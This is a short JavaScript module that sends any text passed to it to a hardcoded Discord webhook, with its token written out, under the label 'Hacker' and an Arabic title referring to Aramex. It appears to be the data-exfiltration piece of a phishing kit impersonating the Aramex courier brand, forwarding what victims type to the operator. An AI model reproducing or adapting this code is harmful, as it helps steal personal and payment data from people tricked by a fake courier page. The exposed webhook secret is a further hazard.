import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326871894762323988/yU6S9Wr7LhkLyZBCytEk8EWFXa0zgcWHif2ex_-q-_fBub82w-oh5wQHaloBIXfuUvOY",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
